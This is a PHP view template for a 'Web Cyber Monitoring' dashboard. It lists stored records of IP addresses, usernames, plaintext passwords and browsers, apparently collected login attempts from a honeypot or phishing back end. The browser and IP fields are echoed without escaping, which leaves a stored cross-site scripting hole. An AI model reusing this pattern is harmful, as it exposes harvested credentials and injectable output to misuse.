
<?php include("header.php");?>
<div class="row col-md-12 account"  style="padding-left: 7%;padding-right: 6%;padding-top:1rem">
    <div class="clear-backend" id="cartaccount" style="height:auto;background: transparent; width: 100%;">
                <div class="card" style="width: 100%;margin-top: 5px;border:0;box-shadow: 0px 0px 10px 1px rgb(0 0 0 / 10%);border-radius: 15px;">
                        <div class="card-body" style="border-radius:15px;">
                            <div class="row" style="padding:10px;text-align:center;">
                                <h3 class="card-title" style="color:#0d6937;font-weight: bolder;">WELCOME!</h3>
                                <p class="card-title" style="color: #686c6f;">Selamat datang di Web Cyber Monitoring</p>
                                <table class="table table-bordered table-hover table-striped" id="dataTable" width="100%" cellspacing="0">
                              <thead>
                                <tr>
                                  <th class="tdfont">#</th>
                                  <th class="tdfont">IP</th>
                                  <th class="tdfont">Username</th>
                                  <th class="tdfont">Password</th>
                                  <th class="tdfont">Browse</th>
                                  <th class="tdfont">Date</th>
                                </tr>
                              </thead>
                              <tbody>
                                <?php
                                $i = 0;
                                foreach ($data as $query) {
                                  $i++ ?>
                                  <tr>
                                    <td class="tdfont"><?= $i ?></td>
                                    <td class="tdfont"><?= $query['ip'] ?></td>
                                    <td class="tdfont"><?php echo "".htmlspecialchars($query['username'])."";?></td>
                                    <td class="tdfont"><?php echo "".htmlspecialchars($query['password']).""; ?></td>
                                    <td class="tdfont"><?= $query['browser'] ?></td>
                                    <td class="tdfont"><?= $query['dateinput'] ?></td>
                                  </tr>
                                <?php } ?>
                              </tbody>
                            </table>
                            </div>
                        </div>
                </div>
        </div>
    </div>
<?php include("foother.php");?>